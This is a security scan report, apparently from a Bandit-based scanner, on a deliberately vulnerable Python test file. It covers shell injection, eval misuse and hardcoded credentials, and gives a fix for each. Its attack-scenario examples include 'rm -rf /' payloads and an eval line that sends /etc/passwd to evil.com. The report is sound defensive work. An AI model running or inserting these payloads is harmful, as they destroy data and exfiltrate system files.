# Security Scan Report
**Target Directory:** /mnt/c/code/AgentSec/test-scan  
**Scan Date:** 2026-02-13T18:30:38Z  
**Scanner:** Bandit v1.x (Python Security Linter)

---

## Executive Summary

**Files Scanned:** 2  
**Total Lines of Code:** 29  
**Security Issues Found:** 3  

### Severity Breakdown
- 🔴 **HIGH Severity:** 1 issue
- 🟡 **MEDIUM Severity:** 1 issue  
- 🟢 **LOW Severity:** 1 issue

### File Status
- ✅ **utils.py** - CLEAN (No vulnerabilities detected)
- ❌ **vulnerable_app.py** - CRITICAL (3 security vulnerabilities)

---

## Critical Findings

### 1. 🔴 HIGH SEVERITY: Shell Injection Vulnerability
**File:** `vulnerable_app.py:21`  
**Test ID:** B602  
**Confidence:** HIGH  
**MITRE ATT&CK:** T1059.004 (Unix Shell Command Execution)

**Vulnerable Code:**
```python
output = subprocess.check_output(cmd, shell=True)
```

**Issue:** Using `subprocess.check_output()` with `shell=True` allows command injection attacks. An attacker can inject malicious shell commands through the `cmd` parameter.

**Attack Scenario:**
```python
# Attacker provides: "ls; rm -rf /"
run_shell_command("ls; rm -rf /")  # Executes both commands!
```

**Remediation:**
```python
# ✅ SECURE: Use shell=False with list of arguments
def run_shell_command(cmd):
    # Split command into list, validate input
    if not isinstance(cmd, list):
        raise ValueError("Command must be a list")
    output = subprocess.check_output(cmd, shell=False)
    return output

# Usage: run_shell_command(['ls', '-l'])
```

**References:**
- [Bandit B602 Documentation](https://bandit.readthedocs.io/en/latest/plugins/b602_subprocess_popen_with_shell_equals_true.html)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)

---

### 2. 🟡 MEDIUM SEVERITY: Arbitrary Code Execution via eval()
**File:** `vulnerable_app.py:15`  
**Test ID:** B307  
**Confidence:** HIGH  
**MITRE ATT&CK:** T1059 (Command and Scripting Interpreter)

**Vulnerable Code:**
```python
def execute_user_command(user_input):
    result = eval(user_input)
    return result
```

**Issue:** The `eval()` function executes arbitrary Python code. An attacker can execute any Python expression, including system commands, file operations, or malicious payloads.

**Attack Scenarios:**
```python
# Delete files
execute_user_command("__import__('os').system('rm -rf /')")

# Exfiltrate data
execute_user_command("__import__('urllib.request').urlopen('http://evil.com?data=' + open('/etc/passwd').read())")

# Crash the application
execute_user_command("1/0")
```

**Remediation:**
```python
# ✅ SECURE: Use ast.literal_eval for safe evaluation of literals only
import ast

def execute_user_command(user_input):
    try:
        # Only evaluates literals: strings, numbers, tuples, lists, dicts
        result = ast.literal_eval(user_input)
        return result
    except (ValueError, SyntaxError):
        raise ValueError("Invalid input: Only literal expressions allowed")

# Alternative: Use a sandboxed expression evaluator or whitelist approach
```

**References:**
- [Bandit B307 Documentation](https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b307-eval)
- [Python ast.literal_eval Documentation](https://docs.python.org/3/library/ast.html#ast.literal_eval)

---

### 3. 🟢 LOW SEVERITY: Subprocess Module Import
**File:** `vulnerable_app.py:5`  
**Test ID:** B404  
**Confidence:** HIGH

**Code:**
```python
import subprocess
```

**Issue:** The `subprocess` module is flagged as potentially dangerous. This is an informational warning to review all subprocess usage carefully.

**Action Required:** Manual review completed. Confirmed HIGH severity issue in line 21 (see Finding #1).

---

## Additional Security Concerns (Manual Review)

### 4. 🔴 CRITICAL: Hardcoded Credentials
**File:** `vulnerable_app.py:9-10`  
**Detection:** Manual code review (not detected by Bandit B105/B106/B107 tests)

**Vulnerable Code:**
```python
api_key = "sk-1234567890abcdef"
password = "admin123"
```

**Issue:** Hardcoded API keys and passwords are exposed in source code. These credentials will be:
- Committed to version control (Git history)
- Visible to anyone with code access
- Difficult to rotate without code changes

**Remediation:**
```python
# ✅ SECURE: Use environment variables
import os

api_key = os.environ.get('API_KEY')
password = os.environ.get('ADMIN_PASSWORD')

if not api_key or not password:
    raise ValueError("Missing required environment variables: API_KEY, ADMIN_PASSWORD")

# Or use a secrets management service (AWS Secrets Manager, HashiCorp Vault, etc.)
```

**Immediate Actions:**
1. ⚠️ **REVOKE** the exposed API key `sk-1234567890abcdef` immediately
2. ⚠️ **ROTATE** all hardcoded credentials
3. ⚠️ **AUDIT** Git history and remove committed secrets using tools like `git-filter-repo` or BFG Repo-Cleaner
4. Configure environment variables or secrets manager for credential storage

---

## File-by-File Analysis

### ✅ utils.py
**Status:** SECURE  
**Lines of Code:** 9  
**Issues Found:** 0  

This file contains safe utility functions with no security vulnerabilities detected.

### ❌ vulnerable_app.py
**Status:** CRITICAL  
**Lines of Code:** 20  
**Issues Found:** 4 (3 from Bandit + 1 from manual review)  

**Summary of Issues:**
1. Shell command injection (HIGH)
2. Arbitrary code execution via eval() (MEDIUM)
3. Hardcoded API key and password (CRITICAL - manual finding)
4. Subprocess module usage (LOW - informational)

---

## Recommendations

### Immediate Actions (Priority 1)
1. ⚠️ **REMOVE or DISABLE** `execute_user_command()` function immediately
2. ⚠️ **REFACTOR** `run_shell_command()` to use `shell=False` with argument lists
3. ⚠️ **REVOKE AND ROTATE** all hardcoded credentials
4. ⚠️ **AUDIT** version control history for exposed secrets

### Short-term Fixes (Priority 2)
1. Implement input validation and sanitization for all user-controlled data
2. Use `ast.literal_eval()` instead of `eval()` for safe evaluation
3. Migrate credentials to environment variables or secrets management
4. Add security testing to CI/CD pipeline

### Long-term Improvements (Priority 3)
1. Implement automated security scanning in CI/CD (Bandit, GuardDog, etc.)
2. Conduct security code review training for developers
3. Establish secure coding guidelines and standards
4. Consider implementing runtime application self-protection (RASP)
5. Regular penetration testing and security audits

---

## OWASP Top 10 Mapping

The vulnerabilities found map to these OWASP Top 10 categories:

- **A03:2021 – Injection** (eval, subprocess with shell=True)
- **A07:2021 – Identification and Authentication Failures** (hardcoded credentials)

---

## Compliance Impact

These vulnerabilities may impact compliance with:
- **PCI DSS:** Requirement 6.5.1 (Injection flaws)
- **HIPAA:** Technical Safeguards (access controls, audit controls)
- **SOC 2:** CC6.1 (Logical and physical access controls)
- **ISO 27001:** A.9.4.1 (Information access restriction)

---

## Scan Metadata

**Command Executed:**
```bash
bandit -r /mnt/c/code/AgentSec/test-scan -f json
```

**Bandit Configuration:**
- Profile: Default
- Tests: All enabled
- Confidence Levels: All (LOW, MEDIUM, HIGH)
- Severity Levels: All (LOW, MEDIUM, HIGH)

**Exit Code:** 1 (vulnerabilities found)

---

## Next Steps

1. Review this report with the development and security teams
2. Prioritize remediation based on severity and exploitability
3. Track remediation progress using a ticketing system
4. Re-scan after fixes to verify resolution
5. Update security baseline and prevent regression

---

**Report Generated By:** AgentSec Security Scanner  
**Contact:** For questions about this report, consult your security team
